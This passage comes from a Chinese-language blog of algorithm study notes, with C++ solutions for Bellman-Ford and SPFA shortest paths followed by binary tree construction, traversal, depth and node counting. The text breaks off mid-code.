边权可能为负数。<br>请你求出从 <span class="hljs-number">1</span>号点到 <span class="hljs-built_in">n</span>号点的最多经过 k条边的最短距离，如果无法从 <span class="hljs-number">1</span>号点走到 <span class="hljs-built_in">n</span>号点，输出 impossible。<br>注意：图中可能 存在负权回路 。<br><br>输入格式<br>第一行包含三个整数 <span class="hljs-built_in">n</span>,m,k。<br>接下来 m行，每行包含三个整数 x,y,z，表示存在一条从点 x到点 y的有向边，边长为 z。<br>点的编号为 <span class="hljs-number">1</span>∼<span class="hljs-built_in">n</span>。<br><br>输出格式<br>输出一个整数，表示从 <span class="hljs-number">1</span>号点到 <span class="hljs-built_in">n</span>号点的最多经过 k条边的最短距离。<br>如果不存在满足条件的路径，则输出 impossible。<br><br>数据范围<br><span class="hljs-number">1</span>≤<span class="hljs-built_in">n</span>,k≤<span class="hljs-number">500</span>,<br><span class="hljs-number">1</span>≤m≤<span class="hljs-number">10000</span>,<br><span class="hljs-number">1</span>≤x,y≤<span class="hljs-built_in">n</span>，<br>任意边长的绝对值不超过 <span class="hljs-number">10000</span>。<br><br>输入样例：<br><span class="hljs-number">3</span> <span class="hljs-number">3</span> <span class="hljs-number">1</span><br><span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">1</span><br><span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">1</span><br><span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">3</span><br>输出样例：<br><span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">510</span>,M=<span class="hljs-number">1e5</span>+<span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> dist[N],backup[N],n,m,k;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">edge</span><br>&#123;<br>    <span class="hljs-type">int</span> a,b,w;<br>&#125;edge[M];<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">bellman_ford</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">memset</span>(dist,<span class="hljs-number">0x3f</span>,<span class="hljs-keyword">sizeof</span> dist);<br>    dist[<span class="hljs-number">1</span>]=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;k;i++)<br>    &#123;<br>        <span class="hljs-built_in">memcpy</span>(backup,dist,<span class="hljs-keyword">sizeof</span> dist);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;m;j++)<br>        &#123;<br>            <span class="hljs-type">int</span> a=edge[j].a,b=edge[j].b,w=edge[j].w;<br>            <span class="hljs-keyword">if</span>(dist[b]&gt;backup[a]+w)<br>                dist[b]=backup[a]+w;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    cin&gt;&gt;n&gt;&gt;m&gt;&gt;k;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;m;i++)<br>    &#123;<br>        <span class="hljs-type">int</span> a,b,w;<br>        cin&gt;&gt;a&gt;&gt;b&gt;&gt;w;<br>        edge[i]=&#123;a,b,w&#125;;<br>    &#125;<br>    <span class="hljs-built_in">bellman_ford</span>();<br>    <span class="hljs-keyword">if</span>(dist[n]&gt;<span class="hljs-number">0x3f3f3f3f</span>/<span class="hljs-number">2</span>) cout&lt;&lt;<span class="hljs-string">&quot;impossible&quot;</span>&lt;&lt;endl;<br>    <span class="hljs-comment">//为啥是0x3f3f3f3f/2，因为当存在负权边的时候，每次更新dist都会变小，但我们还是认为他是正无穷</span><br>    <span class="hljs-keyword">else</span> cout&lt;&lt;dist[n]&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="spfa算法">spfa算法</h2><p>Bellman_ford算法会遍历所有的边，但是有很多的边遍历了其实没有什么意义，我们只用遍历那些到源点距离变小的点所连接的边即可，只有当一个点的前驱结点更新了，该节点才会得到更新；因此考虑到这一点，我们将创建一个队列每一次加入距离被更新的结点。</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs excel">给定一个 <span class="hljs-built_in">n</span>个点 m条边的有向图，图中可能存在重边和自环， 边权可能为负数。<br>请你求出 <span class="hljs-number">1</span>号点到 <span class="hljs-built_in">n</span>号点的最短距离，如果无法从 <span class="hljs-number">1</span>号点走到 <span class="hljs-built_in">n</span>号点，则输出 impossible。<br>数据保证不存在负权回路。<br><br>输入格式<br>第一行包含整数 <span class="hljs-built_in">n</span>和 m。<br>接下来 m行每行包含三个整数 x,y,z，表示存在一条从点 x到点 y的有向边，边长为 z。<br><br>输出格式<br>输出一个整数，表示 <span class="hljs-number">1</span>号点到 <span class="hljs-built_in">n</span>号点的最短距离。<br>如果路径不存在，则输出 impossible。<br><br>数据范围<br><span class="hljs-number">1</span>≤<span class="hljs-built_in">n</span>,m≤<span class="hljs-number">105</span>,<br>图中涉及边长绝对值均不超过 <span class="hljs-number">10000</span>。<br><br>输入样例：<br><span class="hljs-number">3</span> <span class="hljs-number">3</span><br><span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">5</span><br><span class="hljs-number">2</span> <span class="hljs-number">3</span> -<span class="hljs-number">3</span><br><span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br>输出样例：<br><span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;queue&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">2e5</span>;<br><span class="hljs-type">int</span> head[N],val[N],ne[N],w[N],idx,dist[N],n,m;<br><span class="hljs-type">bool</span> state[N];<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b,<span class="hljs-type">int</span> c)</span></span><br><span class="hljs-function"></span>&#123;<br>    val[idx]=b;<br>    w[idx]=c;<br>    ne[idx]=head[a];<br>    head[a]=idx++;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">spfa</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">memset</span>(dist,<span class="hljs-number">0x3f</span>,<span class="hljs-keyword">sizeof</span> dist);<br>    dist[<span class="hljs-number">1</span>]=<span class="hljs-number">0</span>;<br>    queue&lt;<span class="hljs-type">int</span>&gt; q;<br>    state[<span class="hljs-number">1</span>]=<span class="hljs-literal">true</span>;<span class="hljs-comment">//用来判断是否入队列</span><br>    q.<span class="hljs-built_in">push</span>(<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">while</span>(q.<span class="hljs-built_in">size</span>())<br>    &#123;<br>        <span class="hljs-type">int</span> t=q.<span class="hljs-built_in">front</span>();<br>        q.<span class="hljs-built_in">pop</span>();<br>        state[t]=<span class="hljs-literal">false</span>;<span class="hljs-comment">//从队列取出后标记为假</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=head[t];i!=<span class="hljs-number">-1</span>;i=ne[i])<br>        &#123;<br>            <span class="hljs-type">int</span> j = val[i];<br>            <span class="hljs-keyword">if</span>(dist[j]&gt;dist[t]+w[i]) <span class="hljs-comment">// 如果边的权重更新，就将更新的点入栈</span><br>            &#123;<br>                dist[j]=dist[t]+w[i];<br>                <span class="hljs-keyword">if</span>(!state[j])&#123;<br>                    q.<span class="hljs-built_in">push</span>(j);<br>                    state[j]=<span class="hljs-literal">true</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">memset</span>(head,<span class="hljs-number">-1</span>,<span class="hljs-keyword">sizeof</span> head);<br>    cin&gt;&gt;n&gt;&gt;m;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;m;i++)<br>    &#123;<br>        <span class="hljs-type">int</span> a,b,c;<br>        cin&gt;&gt;a&gt;&gt;b&gt;&gt;c;<br>        <span class="hljs-built_in">add</span>(a,b,c);<br>    &#125;<br>    <span class="hljs-built_in">spfa</span>();<br>    <span class="hljs-keyword">if</span>(dist[n]==<span class="hljs-number">0x3f3f3f3f</span>) cout&lt;&lt;<span class="hljs-string">&quot;impossible&quot;</span>&lt;&lt;endl;<br>    <span class="hljs-keyword">else</span> cout&lt;&lt;dist[n]&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="树">树</h1><h2 id="先序创建二叉树">先序创建二叉树</h2><p><strong>算法思想</strong></p><p>先序创建二叉树采用递归的方式实现，先传入二叉树的根节点指针的地址，然后依次递归读入二叉树节点，当读入的是'@'时，将递归得到的根节点赋予NULL，当读入的不为'@'时，将该值赋值到根节点值，并依此递归左儿子和右儿子。</p><p><strong>关键问题1:为什么要传入根节点的地址?</strong></p><p>因为我们已知的是根节点指针，它指向malloc开辟的BiTree空间的首地址，当传入的是根节点指针而不是根节点指针的地址时，在函数中会copy一个该根节点指针指向的空间。但我们如果传入的是根节点指针的地址，函数内部不会重新copy一个空间。</p><p><strong>其思想与函数传入实参和形参相似</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;Traverser.cpp&quot;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">BiTree</span><br>&#123;<br>    <span class="hljs-type">char</span> data;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">BiTree</span> *lchild,*rchild;<br>&#125;BiTree;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CreateBiTree</span><span class="hljs-params">(BiTree* &amp;T)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">char</span> ch;<br>    cin&gt;&gt;ch;<br>    <span class="hljs-keyword">if</span>(ch==<span class="hljs-string">&#x27;@&#x27;</span>) T=<span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">else</span>&#123;<br>        T=(BiTree*)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(BiTree));<br>        T-&gt;data=ch;<br>        <span class="hljs-built_in">CreateBiTree</span>(T-&gt;lchild);<br>        <span class="hljs-built_in">CreateBiTree</span>(T-&gt;rchild);<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PreOrderTraverser</span><span class="hljs-params">(BiTree* &amp;T)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(T)<br>    &#123;<br>        cout&lt;&lt;T-&gt;data&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>        <span class="hljs-built_in">PreOrderTraverser</span>(T-&gt;lchild);<br>        <span class="hljs-built_in">PreOrderTraverser</span>(T-&gt;rchild);<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    BiTree* root;<br>    <span class="hljs-built_in">CreateBiTree</span>(root);<br>    <span class="hljs-built_in">PreOrderTraverser</span>(root);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="遍历二叉树">遍历二叉树</h2><h3 id="代码部分">代码部分</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stack&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">BiTree</span><br>&#123;<br>    <span class="hljs-type">char</span> data;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">BiTree</span> *lchild,*rchild;<br>&#125;BiTree;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CreateBiTree</span><span class="hljs-params">(BiTree* &amp;T)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">char</span> ch;<br>    cin&gt;&gt;ch;<br>    <span class="hljs-keyword">if</span>(ch==<span class="hljs-string">&#x27;@&#x27;</span>) T=<span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">else</span>&#123;<br>        T=(BiTree*)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(BiTree));<br>        T-&gt;data=ch;<br>        <span class="hljs-built_in">CreateBiTree</span>(T-&gt;lchild);<br>        <span class="hljs-built_in">CreateBiTree</span>(T-&gt;rchild);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//递归实现</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PreOrderTraverser</span><span class="hljs-params">(BiTree *T)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(T)<br>    &#123;<br>        cout&lt;&lt;T-&gt;data&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>        <span class="hljs-built_in">PreOrderTraverser</span>(T-&gt;lchild);<br>        <span class="hljs-built_in">PreOrderTraverser</span>(T-&gt;rchild);<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">InOrderTraverser</span><span class="hljs-params">(BiTree *T)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(T)<br>    &#123;<br>        <span class="hljs-built_in">InOrderTraverser</span>(T-&gt;lchild);<br>        cout&lt;&lt;T-&gt;data&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>        <span class="hljs-built_in">InOrderTraverser</span>(T-&gt;rchild);<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PostOrderTraverser</span><span class="hljs-params">(BiTree *T)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(T)<br>    &#123;<br>        <span class="hljs-built_in">PostOrderTraverser</span>(T-&gt;lchild);<br>        <span class="hljs-built_in">PostOrderTraverser</span>(T-&gt;rchild);<br>        cout&lt;&lt;T-&gt;data&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-comment">//非递归实现</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">InOrderTraverser_2</span><span class="hljs-params">(BiTree* T)</span></span><br><span class="hljs-function"></span>&#123;<br>    stack&lt;BiTree*&gt; op;<br>    BiTree* p=T;<br>    <span class="hljs-keyword">while</span>(p||op.<span class="hljs-built_in">size</span>())<br>    &#123;<br>        <span class="hljs-keyword">if</span>(p)&#123;<br>            op.<span class="hljs-built_in">push</span>(p);<br>            p=p-&gt;lchild;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            p=op.<span class="hljs-built_in">top</span>();    <br>            op.<span class="hljs-built_in">pop</span>();<br>            cout&lt;&lt;p-&gt;data&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;                                           <br>            p=p-&gt;rchild;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PreOrderTraverser_2</span><span class="hljs-params">(BiTree* T)</span></span><br><span class="hljs-function"></span>&#123;<br>    stack&lt;BiTree*&gt;op;<br>    BiTree* p=T;<br>    <span class="hljs-keyword">while</span>(p||op.<span class="hljs-built_in">size</span>())<br>    &#123;<br>        <span class="hljs-keyword">if</span>(p)&#123;<br>            cout&lt;&lt;p-&gt;data&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>            op.<span class="hljs-built_in">push</span>(p);<br>            p=p-&gt;lchild;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            p=op.<span class="hljs-built_in">top</span>();<br>            op.<span class="hljs-built_in">pop</span>();<br>            p=p-&gt;rchild;<br>        &#125;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    BiTree* root;<br>    <span class="hljs-built_in">CreateBiTree</span>(root);<br>    <span class="hljs-built_in">PreOrderTraverser</span>(root);<br>    cout&lt;&lt;endl;<br>    <span class="hljs-built_in">PreOrderTraverser_2</span>(root);<br>    cout&lt;&lt;endl;<br>    <span class="hljs-built_in">InOrderTraverser</span>(root);<br>    cout&lt;&lt;endl;<br>    <span class="hljs-built_in">InOrderTraverser_2</span>(root);<br>    cout&lt;&lt;endl;<br>    <span class="hljs-built_in">PostOrderTraverser</span>(root);<br>    cout&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="计算二叉树">计算二叉树</h2><h3 id="代码部分-1">代码部分</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">BiTree</span><br>&#123;<br>    <span class="hljs-type">char</span> data;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">BiTree</span> *lchild,*rchild;<br>&#125;BiTree;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CreateBiTree</span><span class="hljs-params">(BiTree* &amp;T)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">char</span> ch;<br>    cin&gt;&gt;ch;<br>    <span class="hljs-keyword">if</span>(ch==<span class="hljs-string">&#x27;@&#x27;</span>) T=<span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">else</span>&#123;<br>        T=(BiTree*)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(BiTree));<br>        T-&gt;data=ch;<br>        <span class="hljs-built_in">CreateBiTree</span>(T-&gt;lchild);<br>        <span class="hljs-built_in">CreateBiTree</span>(T-&gt;rchild);<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">BiTreeDepth</span><span class="hljs-params">(BiTree* T)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(!T) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-type">int</span> m=<span class="hljs-built_in">BiTreeDepth</span>(T-&gt;lchild);<br>        <span class="hljs-type">int</span> n=<span class="hljs-built_in">BiTreeDepth</span>(T-&gt;rchild);<br>        <span class="hljs-keyword">return</span> m&gt;n?(m+<span class="hljs-number">1</span>):(n+<span class="hljs-number">1</span>);<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">CountNode</span><span class="hljs-params">(BiTree* T)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(T==<span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-built_in">CountNode</span>(T-&gt;lchild)+<span class="hljs-built_in">CountNode</span>(T-&gt;rchild)+<span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">CountLeaves</span><span class="hljs-params">(BiTree* T)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> cnt=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span>(T==<span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span>((!T-&gt;lchild)&amp;&amp;(!T-&gt;rchild))  cnt++;;<br>    <span class="hljs-type">int</span> lcnt=<span class="hljs-built_in">CountLeaves</span>(T-&gt;lchild);<br>    <span 